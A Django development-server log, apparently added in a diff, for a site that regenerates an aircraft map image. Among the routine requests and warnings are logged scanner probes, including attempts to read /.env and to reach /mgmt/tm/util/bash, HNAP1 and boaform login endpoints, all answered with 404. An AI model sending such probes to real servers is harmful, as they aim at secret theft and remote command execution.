+[30/Apr/2023 14:28:44] "GET /static/maps/map.png HTTP/1.0" 200 41889
+[30/Apr/2023 14:28:56] "GET / HTTP/1.0" 400 143
+[30/Apr/2023 14:28:56] "GET / HTTP/1.0" 400 143
+[30/Apr/2023 14:28:57] "GET / HTTP/1.0" 400 143
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+/home/django/belarus-website/map.py:12: RuntimeWarning: More than 20 figures have been opened. Figures created through the pyplot interface (`matplotlib.pyplot.figure`) are retained until explicitly closed and may consume too much memory. (To control this warning, see the rcParam `figure.max_open_warning`). Consider using `matplotlib.pyplot.close()`.
+  self.fig, self.ax = plt.subplots(figsize=(10, 10))
+[30/Apr/2023 14:30:45] "GET /index/ HTTP/1.0" 200 2214
+[30/Apr/2023 14:30:45] "GET /static/maps/map.png HTTP/1.0" 200 42201
+[30/Apr/2023 14:30:52] "GET /.env HTTP/1.0" 404 179
+[30/Apr/2023 14:30:53] "POST / HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 14:32:46] "GET /index/ HTTP/1.0" 200 2029
+[30/Apr/2023 14:32:47] "GET /static/maps/map.png HTTP/1.0" 200 42541
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 14:34:48] "GET /index/ HTTP/1.0" 200 1854
+[30/Apr/2023 14:34:48] "GET /static/maps/map.png HTTP/1.0" 200 42541
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 14:36:49] "GET /index/ HTTP/1.0" 200 1854
+[30/Apr/2023 14:36:49] "GET /static/maps/map.png HTTP/1.0" 200 42541
+[30/Apr/2023 14:38:05] "GET /robots.txt HTTP/1.0" 400 143
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 14:38:50] "GET /index/ HTTP/1.0" 200 2027
+[30/Apr/2023 14:38:50] "GET /static/maps/map.png HTTP/1.0" 200 44110
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 14:40:52] "GET /index/ HTTP/1.0" 200 2028
+[30/Apr/2023 14:40:52] "GET /static/maps/map.png HTTP/1.0" 200 44025
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 14:42:53] "GET /index/ HTTP/1.0" 200 2029
+[30/Apr/2023 14:42:54] "GET /static/maps/map.png HTTP/1.0" 200 44695
+[30/Apr/2023 14:44:19] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 14:44:19] "GET /favicon.ico HTTP/1.0" 404 179
+[30/Apr/2023 14:44:25] "GET /index HTTP/1.0" 301 0
+[30/Apr/2023 14:44:25] "GET /index/ HTTP/1.0" 200 2029
+[30/Apr/2023 14:44:25] "GET /static/maps/map.png HTTP/1.0" 200 44695
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 14:44:55] "GET /index/ HTTP/1.0" 200 2027
+[30/Apr/2023 14:44:55] "GET /static/maps/map.png HTTP/1.0" 200 44925
+[30/Apr/2023 14:45:23] "GET /static/maps/map.png HTTP/1.0" 200 44925
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 14:46:56] "GET /index/ HTTP/1.0" 200 2027
+[30/Apr/2023 14:46:56] "GET /static/maps/map.png HTTP/1.0" 200 45217
+[30/Apr/2023 14:47:23] "GET /index/ HTTP/1.0" 200 2027
+[30/Apr/2023 14:47:23] "GET /static/maps/map.png HTTP/1.0" 200 45217
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 14:48:58] "GET /index/ HTTP/1.0" 200 2028
+[30/Apr/2023 14:48:58] "GET /static/maps/map.png HTTP/1.0" 200 45639
+[30/Apr/2023 14:49:24] "GET /index/ HTTP/1.0" 200 2028
+[30/Apr/2023 14:49:24] "GET /static/maps/map.png HTTP/1.0" 200 45639
+[30/Apr/2023 14:49:48] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 15:06:40] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 15:31:35] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 15:32:07] "GET /.env HTTP/1.0" 404 179
+[30/Apr/2023 15:44:23] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 15:44:26] "GET //index HTTP/1.0" 301 0
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 15:44:28] "GET /index/ HTTP/1.0" 200 1854
+[30/Apr/2023 15:44:28] "GET /static/maps/map.png HTTP/1.0" 200 45639
+[30/Apr/2023 15:45:48] "GET /static/maps/map.png HTTP/1.0" 304 0
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 15:46:33] "GET /index/ HTTP/1.0" 200 1854
+[30/Apr/2023 15:46:33] "GET /static/maps/map.png HTTP/1.0" 200 45639
+[30/Apr/2023 15:47:02] "GET /static/maps/map.png HTTP/1.0" 304 0
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 15:49:03] "GET /index/ HTTP/1.0" 200 1854
+[30/Apr/2023 15:49:03] "GET /static/maps/map.png HTTP/1.0" 200 45639
+[30/Apr/2023 15:49:03] "GET /favicon.ico HTTP/1.0" 404 179
+[30/Apr/2023 15:50:55] "GET /static/maps/map.png HTTP/1.0" 304 0
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 15:51:14] "GET /index/ HTTP/1.0" 200 1854
+[30/Apr/2023 15:51:14] "GET /static/maps/map.png HTTP/1.0" 200 45639
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 15:53:15] "GET /index/ HTTP/1.0" 200 2040
+[30/Apr/2023 15:53:16] "GET /static/maps/map.png HTTP/1.0" 200 46935
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 15:55:17] "GET /index/ HTTP/1.0" 200 2040
+[30/Apr/2023 15:55:17] "GET /static/maps/map.png HTTP/1.0" 200 47002
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 15:57:18] "GET /index/ HTTP/1.0" 200 2039
+[30/Apr/2023 15:57:19] "GET /static/maps/map.png HTTP/1.0" 200 47790
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 15:59:20] "GET /index/ HTTP/1.0" 200 2206
+[30/Apr/2023 15:59:20] "GET /static/maps/map.png HTTP/1.0" 200 48404
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 16:01:21] "GET /index/ HTTP/1.0" 200 2215
+[30/Apr/2023 16:01:21] "GET /static/maps/map.png HTTP/1.0" 200 49430
+[30/Apr/2023 16:02:17] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 16:02:17] "POST /HNAP1/ HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 16:03:23] "GET /index/ HTTP/1.0" 200 2215
+[30/Apr/2023 16:03:23] "GET /static/maps/map.png HTTP/1.0" 200 50142
+[30/Apr/2023 16:09:29] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 16:12:24] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 16:14:21] "POST /boaform/admin/formLogin HTTP/1.0" 404 179
+[30/Apr/2023 16:26:04] "GET / HTTP/1.0" 400 143
+[30/Apr/2023 16:31:20] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 16:56:59] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 16:56:59] "GET /favicon.ico HTTP/1.0" 404 179
+[30/Apr/2023 16:57:02] "GET /index HTTP/1.0" 301 0
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 16:57:03] "GET /index/ HTTP/1.0" 200 1854
+[30/Apr/2023 16:57:03] "GET /static/maps/map.png HTTP/1.0" 200 50142
+[30/Apr/2023 16:58:58] "GET / HTTP/1.0" 400 143
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 16:59:06] "GET /index/ HTTP/1.0" 200 1854
+[30/Apr/2023 16:59:06] "GET /static/maps/map.png HTTP/1.0" 200 50142
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 17:01:07] "GET /index/ HTTP/1.0" 200 1854
+[30/Apr/2023 17:01:07] "GET /static/maps/map.png HTTP/1.0" 200 50142
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 30, 2023 - 17:02:03
+Django version 4.1.1, using settings 'opensky_aircraft.settings'
+Starting development server at http://127.0.0.1:8000/
+Quit the server with CONTROL-C.
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 17:03:10] "GET /index/ HTTP/1.0" 200 1854
+[30/Apr/2023 17:03:10] "GET /static/maps/map.png HTTP/1.0" 200 50142
+[30/Apr/2023 17:05:04] "GET /index/ HTTP/1.0" 200 1854
+[30/Apr/2023 17:05:04] "GET /static/maps/map.png HTTP/1.0" 304 0
+[30/Apr/2023 17:05:05] "GET /index/ HTTP/1.0" 200 1854
+[30/Apr/2023 17:05:06] "GET /index/ HTTP/1.0" 200 1854
+[30/Apr/2023 17:06:48] "GET / HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 17:07:09] "GET /index/ HTTP/1.0" 200 2031
+[30/Apr/2023 17:07:09] "GET /static/maps/map.png HTTP/1.0" 200 51491
+[30/Apr/2023 17:07:20] "GET /index/ HTTP/1.0" 200 2031
+[30/Apr/2023 17:07:20] "GET /static/maps/map.png HTTP/1.0" 304 0
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 17:09:23] "GET /index/ HTTP/1.0" 200 2030
+[30/Apr/2023 17:09:24] "GET /static/maps/map.png HTTP/1.0" 200 51355
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 17:11:25] "GET /index/ HTTP/1.0" 200 2212
+[30/Apr/2023 17:11:25] "GET /static/maps/map.png HTTP/1.0" 200 52526
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 17:13:27] "GET /index/ HTTP/1.0" 200 2215
+[30/Apr/2023 17:13:27] "GET /static/maps/map.png HTTP/1.0" 200 53313
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 30, 2023 - 17:14:44
+Django version 4.1.1, using settings 'opensky_aircraft.settings'
+Starting development server at http://127.0.0.1:8000/
+Quit the server with CONTROL-C.
+[30/Apr/2023 17:15:29] "GET /index/ HTTP/1.0" 500 145
+[30/Apr/2023 17:33:35] "GET /.env HTTP/1.0" 404 179
+[30/Apr/2023 17:33:36] "POST / HTTP/1.0" 404 179
+[30/Apr/2023 17:33:45] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 179
+[30/Apr/2023 17:46:12] "GET /index/ HTTP/1.0" 500 145
+[30/Apr/2023 17:46:39] "POST /mgmt/tm/util/bash HTTP/1.0" 404 179
